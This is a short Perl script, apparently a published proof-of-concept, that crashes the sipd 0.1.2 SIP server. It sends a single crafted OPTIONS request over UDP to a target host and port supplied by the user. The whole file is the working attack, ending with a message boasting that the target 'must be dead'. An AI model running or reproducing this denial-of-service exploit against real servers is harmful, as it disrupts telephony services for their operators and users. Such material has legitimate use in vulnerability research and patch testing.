#!/usr/bin/perl

# SIPd - SIP URI Denial of Service
# Kills sipd version 0.1.2

use IO::Socket;
use strict;

unless (@ARGV == 2) { die "usage: $0 host your_ip [port]" }

my $remote_host = shift(@ARGV);
my $your_host = shift(@ARGV);
my $port = shift(@ARGV);
if ($port eq "")
{
 $port = "5060";
}

my $buf = "OPTIONS sip:A$remote_host SIP/2.0\r\
Via: SIP/2.0/UDP $your_host:3277\r\
From: <sip:$your_host:3277>\r\
To: <sip:$your_host:3277>\r\
Call-ID: 12312312\@$your_host\r\
CSeq: 1 OPTIONS\r\
Max-Forwards: 70\r\
\r\n";

my $socket = IO::Socket::INET->new(Proto => "udp") or die "Socket error: 
$@\n"; my $ipaddr = inet_aton($remote_host) || $remote_host; my $portaddr 
= sockaddr_in($port, $ipaddr);

send($socket, $buf, 0, $portaddr) == length($buf) or die "Can't send: 
$!\n";

print "Now, '$remote_host' must be dead :)\n";

